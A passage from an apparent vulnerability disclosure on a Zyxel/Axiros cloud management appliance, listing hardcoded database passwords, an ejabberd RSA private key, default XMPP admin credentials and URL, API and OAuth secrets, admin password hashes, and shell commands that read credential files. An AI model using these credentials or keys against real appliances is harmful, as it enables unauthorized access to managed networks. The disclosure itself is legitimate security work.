<li>root / axiros from chopin (127.0.0.1)</li>
<li>livedbuser / axzyxel</li>
<li>zyxel / ?? (hash: B149E2C1869FF94FD5ED8F2C882486599B4CF8E4)</li>
</ul>
<p>The access have been extracted from the previous mysql history file and several configuration files:</p>
<pre><code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'61.222.86.79' IDENTIFIED BY 'axiros';
GRANT ALL PRIVILEGES ON *.* TO 'root'@'118.163.48.108' IDENTIFIED BY 'axiros';
INSERT INTO `user` VALUES ('localhost','root','*68CB74FACED3A93905CFA3FA266AF50E17E92A56',[...]
('chopin','root','*68CB74FACED3A93905CFA3FA266AF50E17E92A56',[...]
('127.0.0.1','root','*68CB74FACED3A93905CFA3FA266AF50E17E92A56',[...]
('localhost','debian-sys-maint','*D000798D1C7EC350F7AA4E44B2D68A0770B85194',[...]
('127.0.0.1','livedbuser','*42D02F8D1F74B2F0252592EFFCE69BEEE35FA06B',[...]
('127.0.0.1','zyxel','*B149E2C1869FF94FD5ED8F2C882486599B4CF8E4',[...]
('118.163.48.108','root','*68CB74FACED3A93905CFA3FA266AF50E17E92A56',[...]
('61.222.86.79','root','*68CB74FACED3A93905CFA3FA266AF50E17E92A56',[...]
('%','root','*68CB74FACED3A93905CFA3FA266AF50E17E92A56',[...]
</code></pre>
<p>These passwords are <strong>hardcoded</strong> by the vendor and used everywhere:</p>
<p>From collectd:</p>
<pre><code>&lt;Plugin mysql&gt;
    &lt;Database live&gt;
        Host "127.0.0.1"
        User "livedbuser"
        Password "axzyxel"
        Port 3306
        Database "live"
    &lt;/Database&gt;
&lt;/Plugin&gt;
</code></pre>
<p>From Axess TR-069 solutions:</p>
<pre><code>root@chopin:/opt# cat /opt/axess/etc/axess/TR69/Managers/_live/asynch/mysqlCPEStorage/db.txt
[...]
server=127.0.0.1
port=3306
tablename=CPEManager_CPEs
[...]
user=livedbuser
password=axzyxel
[...]

root@chopin:/opt/axess/opt/axess/zyxel# cat zodb_checkout.sh | grep root
mysqldump -h 127.0.0.1 -u root -paxiros live ScenarioObjects &gt; /opt/axess/zyxel/zyxel_customizations/dbdumps/policies_table.sql
mysqldump -h 127.0.0.1 -u root -paxiros live axalarm_handlers &gt; /opt/axess/zyxel/zyxel_customizations/dbdumps/alarms_table.sql
mysqldump -h 127.0.0.1 -u root -paxiros live AXServiceDefinitionTable &gt; /opt/axess/zyxel/zyxel_customizations/dbdumps/services_table.sql
mysqldump -h 127.0.0.1 -u root -paxiros --no-data live CPEManager_CPEs &gt; /opt/axess/zyxel/zyxel_customizations/dbdumps/cpes_table.sql
</code></pre>
<p>And from various places inside Python code:</p>
<pre><code>/opt/axess/opt/axess/Extensions/recreate_all_realm.pyc
db = MySQLdb.connect(host='127.0.0.1', user='root', passwd='axiros', db=cnmid)
</code></pre>
<p>Also the system account <code>debian-sys-maint</code> is using a non-editable hardcoded password <code>wbboEZ4BN3ssxAfM</code>:</p>
<pre><code>root@chopin:/opt/mysql/etc/mysql# cat debian.cnf 
# Automatically generated for Debian scripts. DO NOT TOUCH!
[client]
host     = localhost
user     = debian-sys-maint
password = wbboEZ4BN3ssxAfM
[...]
host     = localhost
user     = debian-sys-maint
password = wbboEZ4BN3ssxAfM
[...]
</code></pre>
<p><a id="ejabberd-backdoors"></a></p>
<h2>Details - Hardcoded certificate and backdoor access in Ejabberd</h2>
<p>Ejabberd is used to manage all the CPEs connected through TR-069.</p>
<p>The Ejabberd process uses an hardcoded certificate along with a private key:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>root@<span style="color: #0000FF; font-weight: bold">chopin</span>:<span style="color: #666666">/</span>opt<span style="color: #666666">/</span>production_xmpp<span style="color: #666666">/</span>etc<span style="color: #666666">/</span>ejabberd<span style="border: 1px solid #FF0000">#</span> cat ejabberd.cfg
[...]
  {<span style="color: #666666">5222</span>, ejabberd_c2s, [
                        {access, c2s},
                        {shaper, c2s_shaper},
                        {max_stanza_size, <span style="color: #666666">65536</span>},
                        <span style="color: #408080; font-style: italic">%%zlib,</span>
                        starttls, {certfile, <span style="color: #BA2121">&quot;/etc/ejabberd/ejabberd.pem&quot;</span>}
                       ]},
[...]
</pre></div>

<p>Content of <code>ejabberd.pem</code>:</p>
<pre><code>root@chopin:/opt/production_xmpp/etc/ejabberd# cat ejabberd.pem 
-----BEGIN RSA PRIVATE KEY-----
MIICXwIBAAKBgQDppPTghA6irhkzfDA1PyDV/cJzjN946mUV2uq4PiI3Uk5gaIZZ
15CV1rPKKxH1UguIfNHTFfyHC0Td478IprCYuiWE6Yw/5/NTc0pHkW3MeYllc711
R6ZtKTYbn3n5HbmHJzluuBm8qWdgyO2HAG0l1uf5P29Nerra0LMj8MKULwIDAQAB
AoGBAJfMH3ja83NIL4FetydxC1FcnABczzgM+X34jDUF0U8l/1vtrRQj1IE1S/wW
fYVoN6wGhIBjMX0/mg+bjxr8yZBCp96XZCu/POqNqOHPvvFrFryGSzqh/LkG0+tG
ojXjIpYd+Y6eTz2Fj2DPRyczaGJod1SxUz41v92GiyWGTFnhAkEA/Z8Dhxhu8ZNK
nBl+lkE6X0tCZ0kn1Hkq8zIKWVvSsu859u7t7+5/LoBRYkqx0FwoPl2+uBY6BtQV
0AQT/S5d3wJBAOvV+ad1JnGO6gMEnAdtwv0fvBlUB1arisI+CbgUOf9PgPITwEFQ
CvQWktVB8NjjxdaTtYskYvK4NU4SIKCH87ECQQDRcEcRgPPdOq0aS1Nl8Weq2hN0
B82EgKsfOeuh71oHudY8PQLwaBtO41hRuy0ry27QUcn1ayVwDiQVK8j2AxwxAkEA
1oLTyYCijiobKtGXhp5M/OZPto4a+refyBybxIcJVfQf6pESj5XZ0Llzp2yKQQ21
Fv9V4xEeu33YZoHQkZP3kQJBALJPeT67cR8H7k4FdGXFh6vJdNILZ/91ac9cFZf3
ZjabcZWnSgn1QD9ARV/Cd2dsX3xGY4vuoM4hvwjHKAMWHhg=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDEDCCAnmgAwIBAgIJAPvsRdD6v5ITMA0GCSqGSIb3DQEBBQUAMGQxFTATBgNV
BAoTDHp5eGVsLmNvbS50dzEPMA0GA1UECxMGY2hvcGluMREwDwYDVQQDEwhlamFi
YmVyZDEnMCUGCSqGSIb3DQEJARYYcm9vdEBjaG9waW4uenl4ZWwuY29tLnR3MB4X
DTE1MDQxMzE2MzIxNFoXDTE2MDQxMjE2MzIxNFowZDEVMBMGA1UEChMMenl4ZWwu
Y29tLnR3MQ8wDQYDVQQLEwZjaG9waW4xETAPBgNVBAMTCGVqYWJiZXJkMScwJQYJ
KoZIhvcNAQkBFhhyb290QGNob3Bpbi56eXhlbC5jb20udHcwgZ8wDQYJKoZIhvcN
AQEBBQADgY0AMIGJAoGBAOmk9OCEDqKuGTN8MDU/INX9wnOM33jqZRXa6rg+IjdS
TmBohlnXkJXWs8orEfVSC4h80dMV/IcLRN3jvwimsJi6JYTpjD/n81NzSkeRbcx5
iWVzvXVHpm0pNhufefkduYcnOW64GbypZ2DI7YcAbSXW5/k/b016utrQsyPwwpQv
AgMBAAGjgckwgcYwHQYDVR0OBBYEFE1fcSfVUJtFKuVzIr7Ps8lasbKYMIGWBgNV
HSMEgY4wgYuAFE1fcSfVUJtFKuVzIr7Ps8lasbKYoWikZjBkMRUwEwYDVQQKEwx6
eXhlbC5jb20udHcxDzANBgNVBAsTBmNob3BpbjERMA8GA1UEAxMIZWphYmJlcmQx
JzAlBgkqhkiG9w0BCQEWGHJvb3RAY2hvcGluLnp5eGVsLmNvbS50d4IJAPvsRdD6
v5ITMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADgYEAECFhOm4y+Ad31tXd
Nfl2XyU5g6arxLMlrH2sSUcne2EkRNUZsKoEM0MkLUir7oBDqf+gd9dC92zF7qrr
iaeOrMVtFpNu3lBx/YSubhENDyegalWT8zi4TYdxz2ehExGpl0SRjhtrdqs99R+2
gm711P4aV1TQaC+WMpkIP6eyIMM=
-----END CERTIFICATE-----
</code></pre>
<p>Also, the management webservice is reachable on the WAN interface on port 5280/tcp.
It allows to list accounts (linked to CPEs) and remove them.
The authentication is using hardcoded credentials:</p>
<pre><code>http://[ip]:5280/admin/
</code></pre>
<p>An attacker can visit the administration, manage all the CPEs using the default
credentials (<code>a1@chopin</code> / <code>cloud1234</code>) and create some havoc:</p>
<pre><code>http://[ip]:5280/admin/vhosts/
</code></pre>
<p>These credentials are hardcoded inside <code>/opt/axess/opt/axXMPPHandler/config/xmpp_config.py</code>:</p>
<pre><code>XMPP_PORT = 5222
XMPP_SERVER = "127.0.0.1"
XMPP_JID = "a1@chopin"
XMPP_PASS = "cloud1234"
</code></pre>
<p>Also, the permissions of this file are wrong and this file is world-readable</p>
<pre><code>root@chopin:~/pre-auth-rce-4# ls -la /opt/axess/opt/axXMPPHandler/config/xmpp_config.py
-rw-r--r-- 1 root root 1738 Mar  6  2018 /opt/axess/opt/axXMPPHandler/config/xmpp_config.py
</code></pre>
<p>Also, the shared secret for ejabberd replication, called the Erlang cookie, is hardcoded:</p>
<pre><code>root@chopin:/opt/production_xmpp/var/lib/ejabberd# hexdump -C .erlang.cookie
00000000  42 41 4b 56 41 55 48 4d  51 52 49 53 49 4a 59 55  |BAKVAUHMQRISIJYU|
00000010  45 56 4d 4b                                       |EVMK|
00000014
</code></pre>
<p><a id="open-zodb"></a></p>
<h2>Details - Open ZODB storage without authentication</h2>
<p>ZODB is a native object database for Python.</p>
<p>By default, a python process managing the 'Zope Object Database' runs on the appliance and
is reachable over the network on port 8100/tcp without authentication:</p>
<pre><code>/usr/bin/python2.7 /opt/axess/eggs/ZODB3-3.10.5-py2.7-linux-x86_64.egg/ZEO/runzeo.py -C /opt/axess/parts/zeo/etc/zeo.conf
</code></pre>
<p>Configuration:</p>
<pre><code>root@chopin:/opt/axess/opt/axess/parts/zeo/etc# cat zeo.conf 
[...]
  address 8100
  read-only false
[...]
  path /opt/axess/var/filestorage/Data.fs
  blob-dir /opt/axess/var/blobstorage
[...]
</code></pre>
<p>Futhermore, by default, the logfile contains multiple (=~ 100) entries from 2016 about 'insecure mode setting':</p>
<pre><code>2016-02-29T13:45:04 (17833) Blob dir /opt/axess/var/blobstorage/ has insecure mode setting
</code></pre>
<p>The blob directory has wrong permissions and is world-readable:</p>
<pre><code>root@chopin:/opt/axess/opt/axess/var/blobstorage# ls -latr
total 16
drwxr-xr-x 2 210 210 4096 Feb 29  2016 tmp
-rw-r--r-- 1 210 210    0 Jul 12  2016 .removed
-rwxr-xr-x 1 210 210    5 Mar  6  2018 .layout
drwxr-xr-x 3 210 210 4096 Mar  6  2018 .
drwxr-xr-t 6 210 210 4096 Dec 20  2019 ..
root@chopin:/opt/axess/opt/axess/var/blobstorage#
</code></pre>
<p>The <code>Data.fs</code> file has also wrong permissions and is world-readable:</p>
<pre><code>root@chopin:/opt/axess/opt/axess/var/blobstorage# ls -la /opt/axess/opt/axess/var/filestorage/Data.fs
-rw-r--r-- 1 210 210 31398638 Mar  6  2018 /opt/axess/opt/axess/var/filestorage/Data.fs
</code></pre>
<p>This file contains <strong>cookies, password, hashes, access controls parameters, python code, serialized python variables and logs from TR-069</strong>:</p>
<pre><code>U&lt;$2a$04$8B2Na1n.pzBrMw.8CTSBG.zDzWXnJug.qyvRnN/AxYhVFqkhFcmZ2q

U*{SSHA}q3rGsS15vOGeM6Dv0xuwlF0uq91oIHoz0mD8q

# {'CommandResponseList': {'CommandResponse': {'COMMAND': {'ERRNO': u'0', 'ERRMSG': u'OK', 'FORMAT': {'DATASET': {'ATTRIBUTE': [{'_Activate': u'YES'}, {'_ACS_URL': u'http://192.168.50.2:7549/V6ABQNTPYG'}, {'_ACS_Username': u'Wd6XbWa04D7Y'}, {'_ACS_Password': u'6H0pyh1IlyW8'}, {'_Username': ''}, {'_Password': ''}, {'_Server_Type': u'TR069 ACS'}, {'_Periodic_Inform': u'ENABLE'}, {'_Periodic_Inform_Interval': u'900'}, {'_HTTPS_Authentication': u'YES'}, {'_Vantage_Certificate': u'axess_dummy.crt'}, {'_CNM_ID_Switch': u'NO'}, {'_Auto_get_ACS_Activate': u'NO'}, {'_CNM_ID': ''}, {'_XMPP_Activate': u'YES'}, {'_XMPP_Username': u'a2'}, {'_XMPP_Domain': u'chopin'}, {'_XMPP_Resource': u'EC43F6FCC646'}, {'_XMPP_Host': u'192.168.50.2'}]}}}}}, 'ScriptFile': u'/etc/zyxel/ftp/.tmp/tr069download.dat', 'StartTime': u'2017-08-30T09:54:25', 'CompleteTime': u'2017-08-30T09:54:25'}

#subtree = {'CommandResponseList': {'CommandResponse': {'COMMAND': {'ERRNO': u'0', 'ERRMSG': u'OK', 'FORMAT': {'DATASET': {'DATASET': {'ATTRIBUTE': [{'DS_VALUE': u'P2P_201506181030'}, {'IKD_ID': u'3'}, {'negotiation_mode': u'main'}, {'SA_lifetime': u'86400'}, {'key_group': u'group2'}, {'NAT_traversal': u'yes'}, {'dead_peer_detection': u'yes'}, {'fall_back': u'deactivate'}, {'fall_back_check_interval': u'300'}, {'authentication_method': u'pre-share'}, {'pre_shared_key': u'87654321'}, {'certificate': u'default'}, {'user_ID': ''}, {'type': ''}, {'VPN_connection': u'P2P_201506181030'}, {'vcp_reference_count': u'0'}, {'IKE_version': u'IKEv1'}, {'active': u'yes'}], 'DATASET': [{'ATTRIBUTE': [{'DS_VALUE': u'1'}, {'encryption': u'3des'}, {'authentication': u'sha'}]}, {'ATTRIBUTE': [{'DS_VALUE': u'192.168.50.3'}, {'type': u'ip'}]}, {'ATTRIBUTE': [{'DS_VALUE': u'1'}, {'address': u'192.168.50.8'}]}, {'ATTRIBUTE': [{'DS_VALUE': u'2'}, {'address': u'0.0.0.0'}]}, {'ATTRIBUTE': [{'DS_VALUE': u'B0B2DC7189C4'}, {'type': u'fqdn'}]}, {'ATTRIBUTE': [{'DS_VALUE': u'201506181030'}, {'type': u'fqdn'}]}, {'ATTRIBUTE': [{'DS_VALUE': u'no'}, {'type': ''}, {'method': ''}, {'username': ''}, {'password': ''}]}, {'ATTRIBUTE': [{'DS_VALUE': u'no'}, {'type': ''}, {'aaa_method': ''}, {'allowed_user': ''}, {'allowed_auth_method': u'mschapv2'}, {'username': ''}, {'auth_method': u'mschapv2'}, {'password': ''}]}]}}}}}}, 'ScriptFile': u'/etc/zyxel/ftp/.tmp/tr069download.dat', 'StartTime': u'2017-06-21T04:10:09', 'CompleteTime': u'2017-06-21T04:10:09'}
</code></pre>
<p><strong>Exposing this service on the WAN is likely to be a bad idea and will result as a pre-auth RCE as <code>axess</code></strong>.</p>
<p><a id="myzyxel-hardcoded-secret"></a></p>
<h2>Details - MyZyxel 'Cloud' Hardcoded Secret</h2>
<p>The device can connect to the MyZyxel service. The code responsible to exchange information between the appliance and the 'Cloud' is written in java.</p>
<p>The JAR file is executed from <code>myzyxel.pyc</code> using <code>subprocess.Popen</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">decrypt</span>(encrypted_string, encrypted_secret_key, action<span style="color: #666666">=</span><span style="color: #BA2121">&#39;aes_decode_with_plain_key&#39;</span>):
    JAVA_PROGRAM <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;java&#39;</span>
    Delegate_Util <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;/opt/axess/Extensions/custom_code/MZCDelegate-protect.jar&#39;</span>
    RESULT_DECODING <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;UTF-8&#39;</span>
    sp <span style="color: #666666">=</span> subprocess<span style="color: #666666">.</span>Popen([JAVA_PROGRAM, <span style="color: #BA2121">&#39;-jar&#39;</span>, Delegate_Util, action, encrypted_secret_key, encrypted_string], stdout<span style="color: #666666">=</span>subprocess<span style="color: #666666">.</span>PIPE, stderr<span style="color: #666666">=</span>subprocess<span style="color: #666666">.</span>PIPE)
    [<span style="color: #666666">...</span>]
</pre></div>

<p>The <code>MZCDelegate-protect.jar</code> file contains specific Zyxel code for encryption and has an interesting hardcoded resource file (<code>IV.dat</code>).</p>
<p>When reading the java code, it appears this <code>IV.dat</code> resource is used as as Secret Key along with a defined Initialization Vector (containing only 0s).</p>
<p>It seems this behavior may not completely follow best practices when dealing with encryption:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">[...]</span>
<span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">final</span> String <span style="color: #0000FF">a</span><span style="color: #666666">(</span>String str<span style="color: #666666">)</span> <span style="color: #666666">{</span>
    IvParameterSpec ivParameterSpec <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> IvParameterSpec<span style="color: #666666">(</span><span style="color: #008000; font-weight: bold">new</span> <span style="color: #B00040">byte</span><span style="color: #666666">[]{0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0,</span> <span style="color: #666666">0});</span>
    ObjectInputStream objectInputStream <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> ObjectInputStream<span style="color: #666666">(</span>getClass<span style="color: #666666">().</span><span style="color: #7D9029">getResourceAsStream</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;/IV.dat&quot;</span><span style="color: #666666">));</span>
    <span style="color: #008000; font-weight: bold">try</span> <span style="color: #666666">{</span>
        Cipher instance <span style="color: #666666">=</span> Cipher<span style="color: #666666">.</span><span style="color: #7D9029">getInstance</span><span style="color: #666666">(</span><span style="color: #BA2121">&quot;AES/CBC/PKCS5Padding&quot;</span><span style="color: #666666">);</span>
        instance<span style="color: #666666">.</span><span style="color: #7D9029">init</span><span style="color: #666666">(2,</span> <span style="color: #666666">(</span>SecretKeySpec<span style="color: #666666">)</span> objectInputStream<span style="color: #666666">.</span><span style="color: #7D9029">readObject</span><span style="color: #666666">(),</span> ivParameterSpec<span style="color: #666666">);</span>
        String str2 <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> String<span style="color: #666666">(</span>instance<span style="color: #666666">.</span><span style="color: #7D9029">doFinal</span><span style="color: #666666">(</span>Base64<span style="color: #666666">.</span><span style="color: #7D9029">decodeBase64</span><span style="color: #666666">(</span>str<span style="color: #666666">)));</span>
        objectInputStream<span style="color: #666666">.</span><span style="color: #7D9029">close</span><span style="color: #666666">();</span>
        <span style="color: #008000; font-weight: bold">return</span> str2<span style="color: #666666">;</span>
    <span style="color: #666666">}</span>
<span style="color: #666666">[...]</span>
</pre></div>

<p>Content of <code>IV.dat</code>:</p>
<pre><code>vm# hexdump -C ./resources/IV.dat
00000000  ac ed 00 05 73 72 00 1f  6a 61 76 61 78 2e 63 72  |....sr..javax.cr|
00000010  79 70 74 6f 2e 73 70 65  63 2e 53 65 63 72 65 74  |ypto.spec.Secret|
00000020  4b 65 79 53 70 65 63 5b  47 0b 66 e2 30 61 4d 02  |KeySpec[G.f.0aM.|
00000030  00 02 4c 00 09 61 6c 67  6f 72 69 74 68 6d 74 00  |..L..algorithmt.|
00000040  12 4c 6a 61 76 61 2f 6c  61 6e 67 2f 53 74 72 69  |.Ljava/lang/Stri|
00000050  6e 67 3b 5b 00 03 6b 65  79 74 00 02 5b 42 78 70  |ng;[..keyt..[Bxp|
00000060  74 00 03 41 45 53 75 72  00 02 5b 42 ac f3 17 f8  |t..AESur..[B....|
00000070  06 08 54 e0 02 00 00 78  70 00 00 00 20 ac d3 eb  |..T....xp... ...|
00000080  1d 3c c1 af 97 82 59 ab  2b d5 00 9d 64 1f b5 1c  |.&lt;....Y.+...d...|
00000090  bf 49 ed 2a 23 7c 65 f0  97 54 cc 88 09           |.I.*#|e..T...|
0000009d
</code></pre>
<p>Finally, it is interesting to note that <code>myzyxel.pyc</code> contains also hardcoded credentials:</p>
<pre><code>user_key_id = '4B1D916BE2FA76042316'
user_secret = 'PAZsJJ55frFmNivjAzgjYPC4fCQc3Wi9WVVZ5w=='
</code></pre>
<p><a id="hardcoded-secrets-apis"></a></p>
<h2>Details - Hardcoded Secrets, API</h2>
<p>When reading the source code of the web (Python) application, it appears some critical variables are being imported:</p>
<pre><code>root@chopin:/opt/axess/opt/axess# cat /opt/axess/opt/axess/zyxel/zyxel_customizations/live.CloudCNMEntryPoint/config/config.py
axess_config = container.TR69Utils.get_axess_default_config()
config = {
    "zyxel_portal": {
        "host": axess_config.get('ZYXEL_PORTAL_HOST'),
        "app_key": axess_config.get('APP_KEY'),
        "login_redirect_uri": "/live/CloudCNMEntryPoint",
        "logout_redirect_uri": "/live/CloudCNMEntryPoint"
    }, "oauth_secret_key": axess_config.get('OAUTH_SECRET_KEY'),
    "jwt_secret": axess_config.get('SERVER_ACCESS_SECRET'),
    "jwt_secret_id": axess_config.get('SERVER_ACCESS_KEY_ID'),
    "account_api_url": axess_config.get('ACCOUNT_API_URL'),
    "https_verify": axess_config.get('HTTPS_VERIFY') == True,
}
</code></pre>
<p>The hardcoded configuration parameters come directly from the <code>/opt/axess/etc/default/axess</code> file:</p>
<pre><code>NBI_USER="admin"
NBI_PASS="ax"
# Zyxel specific parameters
SERVER_ACCESS_KEY_ID=""
SERVER_ACCESS_SECRET=""
CNMS_API_URL="https://api.myzyxel.com/v1/my/cloud_cnms"
SECU_API_URL="https://api.myzyxel.com/v2/my/secu_managers"
APP_KEY="85ca73265e977fd46805163b8f7d66b0395b56f31b7e5850f2514f10d41a482b"
OAUTH_SECRET_KEY="SvaK1LoGZMu8ZgZ6TKJGCwx+xiEBooSLmaQUiyAyUDTDbHFZtT3PCob9QL/pfzA3oGw0t0ANVO4KTbkrAwonP4lL+ax0ijqS9cAtTPGSMfw="
ZYXEL_PORTAL_HOST="https://portal.myzyxel.com/"
DECRYPT_URL=""
</code></pre>
<p>Furthermore, the permissions of this file allows any user to read this file:</p>
<pre><code>root@chopin:/opt/axess/opt/axess# ls -la /opt/axess/etc/default/axess
-rw-r--r-- 1 root root 2607 Mar  6  2018 /opt/axess/etc/default/axess
</code></pre>
<p>These hardcoded keys are used for secure communications between the appliance and the 'Cloud' management.</p>
<p><a id="predefined-pwd-admins"></a></p>
<h2>Details - Predefined passwords for admin accounts</h2>
<p>By default, we can extract the pre-defined admin and the pre-defined users from mysql:</p>
<pre><code>mysql&gt; select * from Administrator_users;
+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| uid   | props                                                                                                                                                                                                                                                                                      |
+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| admin | {'username': 'admin', 'created_ts': 'Mon Mar 21 15:48:12 2016', 'roles': (), 'authdbid': 'Administrator-911324', 'created_by': 'axiros', 'miscProps': {}, 'additional_props': {'fullname': ''}, 'password': '$2a$04$O2K8FGHtvfaLE7QaIVlgP.GO0CWfrwwBuFBRNTvghCrfvf.nZAg0C', 'id': 'admin'} |
+-------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

mysql&gt; select * from Users_users;
+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| uid   | props                                                                                                                                                                                                                                                                                                                                         |
+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| admin | {'username': 'admin', 'created_ts': 'Fri May  8 11:25:20 2015', 'roles': ['Manager'], 'authdbid': 'Users-342940', 'password_change_ts': 'Mon Jun  8 15:45:45 2015', 'created_by': 'axiros', 'miscProps': {}, 'additional_props': {'fullname': ''}, 'password': '$2a$04$4YkCCSqUFy4hf/5WluCok./OVGe2LSQZNF4IR4Je5H7xqzfMrivmm', 'id': 'admin'} |
+-------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
</code></pre>
<p>By doing some forensic, it is also trivial to extract previous admin/users:</p>
<pre><code>root@chopin:/opt/mysql/var/lib/mysql/live# strings Administrator_users.*
{'username': 'admin', 'created_ts': 'Mon Mar 21 15:48:12 2016', 'roles': (), 'authdbid': 'Administrator-911324', 'created_by': 'axiros', 'miscProps': {}, 'additional_props': {'fullname': ''}, 'password': '$2a$04$O2K8FGHtvfaLE7QaIVlgP.GO0CWfrwwBuFBRNTvghCrfvf.nZAg0C', 'id': 'admin'}
, 'id': 'admin'}
me': 'greg', 'created_ts': 'Mon Oct 12 13:01:38 2015', 'roles': (), 'authdbid': 'Administrator-911324', 'password_change_ts': 'Thu Mar  3 09:33:36 2016', 'created_by': 'axiros', 'miscProps': {}, 'additional_props': {'fullname': ''}, 'password': '$2a$04$ZKtY/VngGeHngrO55Rv.N.I3rPXdUuY3tEC3Tg1LuGSUwJJIOR3PW', 'id': 'greg'}
me': 'yjyeh', 'created_ts': 'Wed Feb 17 11:47:07 2016', 'roles': (), 'authdbid': 'Administrator-911324', 'created_by': 'lorinyeh', 'miscProps': {}, 'additional_props': {'fullname': ''}, 'password': '$2a$04$rhS/v/aR8rkBCXL0f9iD.OhT9Gb9hwuvh.0KpuQBLgFfZzMMOeCnS', 'id': 'yjyeh'}
me': 'wang', 'created_ts': 'Tue Feb 23 22:24:11 2016', 'roles': (), 'authdbid': 'Administrator-911324', 'password_change_ts': 'Tue Feb 23 22:49:27 2016', 'created_by': 'axiros', 'miscProps': {}, 'additional_props': {'fullname': ''}, 'password': '$2a$04$ZbDh/hVwIR7vhykP2Du2eO6r4NcKE2kzKX3/./j9dL14JrO8FR5FS', 'id': 'wang'}
': 'ir', 'created_ts': 'Wed Mar  2 23:30:58 2016', 'roles': (), 'authdbid': 'Administrator-911324', 'password_change_ts': 'Wed Mar  2 23:31:34 2016', 'created_by': None, 'miscProps': {}, 'additional_props': {'fullname': 'Axiros Gmbh Ingo Rubach'}, 'password': '$2a$04$RxHVLGGKb3E6fhd32FJWSeObJmQpcEDJM62lgzL8bxLqPDsH9LSdi', 'id': 'ir'}
admin
yjyeh
</code></pre>
<p>These information can be useful to find backdoor access.</p>
<p><a id="insecure-cloud"></a></p>
<h2>Details - Insecure management over the 'Cloud'</h2>
<p>By default, myzxel.pyc used for communication to the 'Cloud' uses some hardcoded variables for communication over HTTPS:</p>
<pre><code>SERVER_ACCESS_KEY_ID = get_cfg_val('SERVER_ACCESS_KEY_ID')
SERVER_ACCESS_SECRET = get_cfg_val('SERVER_ACCESS_SECRET')
CNMS_API_URL = get_cfg_val('CNMS_API_URL')
HTTPS_VERIFY = get_cfg_val('HTTPS_VERIFY') == 'true'

SERVER_ACCESS_KEY_ID will be generated by the Cloud server
SERVER_ACCESS_SECRET will be generated by the Cloud server
CNMS_API_URL will be https://api.myzyxel.com/v2/my/secu_managers
</code></pre>
<p>The function <code>get_account_info</code> uses the <code>account_id</code>, the <code>jwt_secret</code> and the <code>jwt_secret_id</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span><span style="color: #666666">106</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">get_account_info</span>(account_id, jwt_secret, jwt_secret_id):
[<span style="color: #666666">...</span>]
<span style="color: #666666">107</span>     payload <span style="color: #666666">=</span> [<span style="color: #666666">...</span>]                                 <span style="color: #408080; font-style: italic"># 1. generation of the payload</span>
<span style="color: #666666">110</span>     jwt_token <span style="color: #666666">=</span> jwt_gen(payload, jwt_secret)        <span style="color: #408080; font-style: italic"># 2. jwt_gen encodes the post payload using the empty jwt_secret value</span>
<span style="color: #666666">111</span>     post_data <span style="color: #666666">=</span> {<span style="color: #BA2121">&#39;access_key_id&#39;</span>: jwt_secret_id,    <span style="color: #408080; font-style: italic"># 3. new post data contains access_key_id=&amp;token=post-data</span>
<span style="color: #666666">112</span>        <span style="color: #BA2121">&#39;token&#39;</span>: jwt_token}                          <span style="color: #408080; font-style: italic">#</span>
<span style="color: #666666">113</span>     <span style="color: #008000; font-weight: bold">try</span>:
<span style="color: #666666">114</span>         r <span style="color: #666666">=</span> requests<span style="color: #666666">.</span>get(SECU_API_URL, verify<span style="color: #666666">=</span>HTTPS_VERIFY, data<span style="color: #666666">=</span>post_data)
<span style="color: #666666">115</span>         r<span style="color: #666666">.</span>raise_for_status()               <span style="color: #408080; font-style: italic">#      ^^- 4. the request is sent to https://api.myzyxel.com/v2/my/secu_managers</span>
<span style="color: #666666">116</span>         response <span style="color: #666666">=</span> r<span style="color: #666666">.</span>json()
<span style="color: #666666">117</span>     <span style="color: #008000; font-weight: bold">except</span> requests<span style="color: #666666">.</span>exceptions<span style="color: #666666">.</span>ConnectionError <span style="color: #008000; font-weight: bold">as</span> e:
<span style="color: #666666">118</span>         response <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;ConnectionError&#39;</span>
<span style="color: #666666">119</span> 
<span style="color: #666666">120</span>     <span style="color: #008000; font-weight: bold">return</span> response

<span style="color: #666666">102</span> <span style="color: #008000; font-weight: bold">def</span> <span style="color: #0000FF">jwt_gen</span>(payload, secret, algorithm<span style="color: #666666">=</span><span style="color: #BA2121">&#39;HS256&#39;</span>):
<span style="color: #666666">103</span>     <span style="color: #008000; font-weight: bold">return</span> jwt<span style="color: #666666">.</span>encode(payload, secret, algorithm)
</pre></div>

